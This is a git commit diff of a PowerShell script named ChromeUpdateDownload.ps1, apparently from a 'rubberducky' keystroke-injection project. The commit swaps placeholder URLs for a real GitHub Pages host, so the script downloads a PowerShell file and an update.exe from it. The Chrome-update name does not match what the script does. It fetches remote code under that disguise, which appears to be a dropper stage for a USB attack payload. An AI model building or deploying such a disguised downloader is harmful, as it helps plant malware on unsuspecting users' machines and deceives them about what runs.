0775a7d17f928c7a1a8807d5188344ca4f054255
MoChalati <102216282+MoChalati@users.noreply.github.com>
2024-06-17 14:31:37 +0200

    ChromeUpdateDownload.ps1

--- ChromeUpdateDownload.ps1
+++ ChromeUpdateDownload.ps1
@@ -1,2 +1,2 @@
-wget 'https://username.github.io/repository/maintenance.ps1' -OutFile maintenance.ps1
-wget 'https://username.github.io/repository/update.exe' -OutFile update.exe
+wget 'https://mochalati.github.io/rubberducky/maintenance.ps1' -OutFile maintenance.ps1
+wget 'https://mochalati.github.io/rubberducky/update.exe' -OutFile update.exe
